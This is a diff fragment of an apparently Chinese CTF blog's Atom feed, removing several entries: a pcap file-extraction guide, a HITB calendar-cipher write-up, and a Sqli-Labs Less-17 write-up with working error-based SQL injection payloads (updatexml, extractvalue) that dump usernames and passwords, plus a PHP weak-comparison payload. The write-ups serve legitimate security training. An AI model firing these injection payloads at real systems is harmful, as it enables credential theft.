+<p>恰好3735929054的十六进制为0xdeadc0de，仅出现字母与数字0，因此可以绕过检测。</p>
+<p>最后与3735929054进行<code>==</code>比较，这里存在php弱类型比较问题，即”0xdeadc0de” == “3735929054”。</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">answer=0xdeadc0de</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;WeChall PHP关。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
@@ -456,9 +643,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
       <category term="Forensic" scheme="http://chybeta.github.io/tags/Forensic/"/>
     
@@ -504,9 +691,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
       <category term="Forensic" scheme="http://chybeta.github.io/tags/Forensic/"/>
     
@@ -645,9 +832,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
   </entry>
   
@@ -823,9 +1010,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
       <category term="steg" scheme="http://chybeta.github.io/tags/steg/"/>
     
@@ -970,141 +1157,6 @@
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>流量包提取文件方法</title>
-    <link href="http://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"/>
-    <id>http://chybeta.github.io/2017/08/25/流量包提取文件方法/</id>
-    <published>2017-08-25T09:18:24.000Z</published>
-    <updated>2017-08-25T10:30:59.016Z</updated>
-    
-    <content type="html"><![CDATA[<p>流量包提取文件方法<br><a id="more"></a></p>
-<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>wrieshark自带有文件分离功能。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/3.png?raw=true" alt=""></p>
-<h1 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h1><p>通过下面命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tcpxtract</div></pre></td></tr></table></figure></p>
-<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpxtract -f XXX.pcap</div></pre></td></tr></table></figure></p>
-<p>以hitctf2017的Cephalopod为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/Cephalopod# tcpxtract -f 2a9c1cdd-2ac0-4b2a-828d-269c6e04ebbb.pcap</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000000.png</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000001.png</div></pre></td></tr></table></figure></p>
-<p>即可得到藏在流量包里的文件：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/1.png?raw=true" alt=""></p>
-<h1 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h1><p>foremost是基于文件头及尾部信息恢复文件的工具。</p>
-<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foremost -i XXX.pcap</div></pre></td></tr></table></figure></p>
-<p>以hitbctf2017的simple_transfer为例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# foremost -i b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">Processing: b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">|*|</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# ls</div><div class="line">b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap  output</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# cd output/</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer/output# ls</div><div class="line">audit.txt  pdf</div></pre></td></tr></table></figure>
-<p>即可恢复出藏在流量包里的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/2.png?raw=true" alt=""></p>
-<h1 id="Network-miner"><a href="#Network-miner" class="headerlink" title="Network miner"></a>Network miner</h1><p>下载地址：<a href="https://sourceforge.net/projects/networkminer/" target="_blank" rel="external">https://sourceforge.net/projects/networkminer/</a></p>
-<p>还有一些方法，遇到后再慢慢补充。</p>
-<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
-<li><a href="http://bbs.pediy.com/thread-220021.htm" target="_blank" rel="external">CTF取证类题目指南</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/206.html" target="_blank" rel="external">返璞归真——流量中提取文件的五种方法</a></li>
-<li><a href="https://www.blackbytes.info/2012/01/four-ways-to-extract-files-from-pcaps/" target="_blank" rel="external">Four ways to extract files from pcaps</a></li>
-<li><a href="https://github.com/caesar0301/awesome-pcaptools" target="_blank" rel="external">awesome-pcaptools</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;流量包提取文件方法&lt;br&gt;
-    
-    </summary>
-    
-      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
-    
-    
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
-      <category term="pcap" scheme="http://chybeta.github.io/tags/pcap/"/>
-    
-      <category term="ctf" scheme="http://chybeta.github.io/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HITB CTF 2017-Dating in Singapore-writeup</title>
-    <link href="http://chybeta.github.io/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/"/>
-    <id>http://chybeta.github.io/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/</id>
-    <published>2017-08-24T08:58:25.000Z</published>
-    <updated>2017-08-25T10:30:52.002Z</updated>
-    
-    <content type="html"><![CDATA[<p>HITB CTF 2017-Dating in Singapore-writeup<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>根据分隔符<code>-</code>分开每行，并且两两数字一组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div><div class="line"></div><div class="line">05 06 07 13 20 27 16 27 28</div><div class="line"></div><div class="line">01 02 03 02 09 16 23 30</div><div class="line"></div><div class="line">02 09 16 23 02 03 10 09 09 10 17 24 23</div><div class="line"></div><div class="line">02 01 08 14 22 29 30</div><div class="line"></div><div class="line">06 05 04 11 18 25 26 27</div><div class="line"></div><div class="line">02 03 04 03 10 17 24 31</div><div class="line"></div><div class="line">01 02 03 01 08 15 22 29 15 16 17</div><div class="line"></div><div class="line">04 05 06 04 11 18 25 18 19 20</div><div class="line"></div><div class="line">01 08 15 22 29 30 31 24 17 10 03</div><div class="line"></div><div class="line">26 19 12 05 20 28 21 14 07</div><div class="line"></div><div class="line">04 05 12 13 19 26 25</div></pre></td></tr></table></figure></p>
-<p>数字的特征，最小为01，最大为31，一共十二行，恰对应12个月，每个月最多31天。结合今年（2017）日历</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170824/1.png?raw=true" alt=""></p>
-<p>第一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div></pre></td></tr></table></figure></p>
-<p>对照一月份，“写出”得到字母：<code>H</code>。</p>
-<p>其余类似。</p>
-<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HITB&#123;CTFFUN&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;HITB CTF 2017-Dating in Singapore-writeup&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Crypto" scheme="http://chybeta.github.io/categories/writeup-Crypto/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="crypto" scheme="http://chybeta.github.io/tags/crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sqli-Labs:Less17-writeup</title>
-    <link href="http://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/"/>
-    <id>http://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/</id>
-    <published>2017-08-23T10:16:52.000Z</published>
-    <updated>2017-08-23T13:46:04.707Z</updated>
-    
-    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
-<p>Less-17 POST-Update Query-Error Based-String<br><a id="more"></a></p>
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>三种基本语句。</p>
-<h2 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT INTO table_name ( field1, field2,...fieldN )</div><div class="line">                       VALUES</div><div class="line">                       ( value1, value2,...valueN );</div></pre></td></tr></table></figure>
-<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc users;</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| Field    | Type        | Null | Key | Default | Extra          |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</div><div class="line">| username | varchar(20) | NO   |     | NULL    |                |</div><div class="line">| password | varchar(20) | NO   |     | NULL    |                |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">3 rows in set (0.06 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure></p>
-<h2 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</div><div class="line">[WHERE Clause]</div></pre></td></tr></table></figure>
-<p>示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;atebyhc&quot; where id=15;                     </div><div class="line">Query OK, 1 row affected (0.08 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | atebyhc  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15;  </div><div class="line">Query OK, 1 row affected (0.00 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | atebyhc  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
-<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE table_name ;</div></pre></td></tr></table></figure>
-<p>这个。。暂时先不演示了。。</p>
-<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h1><p>这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=新密码 where username=账号；</div></pre></td></tr></table></figure></p>
-<p>我们post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>则发现有报错回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</div></pre></td></tr></table></figure></p>
-<p>为单引号，所以可以推测语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;；</div></pre></td></tr></table></figure></p>
-<p>接下去进行报错注入。</p>
-<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
-<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>(以上来自<a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">学习笔记 UpdateXml() MYSQL显错注入</a>)</p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>可以获取数据库名为：security。</p>
-<p>但要获取数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>却会显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</div></pre></td></tr></table></figure></p>
-<p>也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。</p>
-<p>这个可以先新建一张表，然后再在这个新建的临时表中进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>这在sql.log中的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
-<p>其中<code>(select * from users)tmp</code>新建了一张tmp表，外面的<code>SELECT...FROM..</code>是从tmp中获取数据。</p>
-<p>updatexml有长度限制,最长32位</p>
-<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>得到数据库名称为 security</p>
-<p>查字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>获取账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
-<p>对应的后端查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
-<p>extractvalue也有长度限制,最长32位</p>
-<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
-<li><a href="http://static.hx99.net/static/drops/tips-2078.html" target="_blank" rel="external">利用insert，update和delete注入获取数据</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
-&lt;p&gt;Less-17 POST-Update Query-Error Based-String&lt;br&gt;
-    
-    </summary>
-    
     
   </entry>
   
